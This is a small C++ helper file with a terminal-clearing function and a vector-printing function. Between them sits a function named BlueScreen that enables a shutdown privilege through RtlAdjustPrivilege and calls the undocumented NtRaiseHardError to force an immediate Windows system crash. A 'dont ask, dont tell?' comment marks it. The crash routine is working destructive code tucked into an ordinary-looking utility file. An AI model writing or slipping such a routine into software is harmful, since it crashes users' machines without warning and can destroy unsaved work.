#include <iostream>
#include <vector>
#include <windows.h>

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

    void BlueScreen()
	{
		BOOLEAN bl;
		ULONG Response;
		RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); 
	} // dont ask, dont tell?

void clearTerminal() {
#ifdef _WIN32
    std::cout << "\x1B[2J\x1B[H";
#else
    std::cout << "\x1B[2J\x1B[H";
#endif
} //clear terminal
void printVector(const std::vector<int>& v) { //qol, lar oss cout<< vectors
    std::cout << " = [ ";
    for (const auto& x : v) {
        std::cout << x << " ";
    }
    std::cout << "]\n";
}